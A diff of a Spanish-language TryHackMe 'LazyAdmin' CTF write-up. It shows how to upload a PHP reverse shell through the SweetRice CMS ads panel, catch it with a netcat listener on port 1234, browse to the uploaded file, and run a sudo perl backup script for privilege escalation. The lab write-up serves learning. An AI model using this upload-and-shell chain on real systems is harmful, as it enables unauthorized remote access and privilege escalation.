@@ -197,12 +197,24 @@ http://localhost/sweetrice/inc/ads/hacked.php
   -->
 ```
 
-Tal y como lo describe necesitamos tener acceso a una cuenta admin del CMS para luego acceder al panel de ads.Una vez ahí subir el codigo que nos dará una reverse shell. En mi caso utilicé `/usr/share/webshells/php/php-reverse-shell.php` cambiando los parámetros de la IP con mi dirección y el puerto por el 1234.
+Tal y como lo describe necesitamos tener acceso a una cuenta admin del CMS para luego acceder al panel de ads. Una vez ahí subir el codigo que nos dará una reverse shell sustituyendo `<?php echo '<h1> Hacked </h1>'; phpinfo();?>`por nuestro código. En mi caso utilicé `/usr/share/webshells/php/php-reverse-shell.php` cambiando los parámetros de la IP con mi dirección y el puerto por el 1234.
+
+
+![alt text](https://github.com/k1m3rA321/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/exploit1.png)
+
+
+Una vez hayamos subido el archivo ponemos en escucha el puerto `1234` con netcat:
 
 
 
+```console
+kimera@vault:~/Machines/THM/LazyAdmin/exploit$ nc -nlvp 1234
+listening on [any] 1234 ...
+```
 
+Y entramos en la URL donde se aloja el archivo que recién subimos: `http://10.10.109.87/content/inc/ads/reverse.php`
 
+sudo /usr/bin/perl /home/itguy/backup.pl
 
 
 
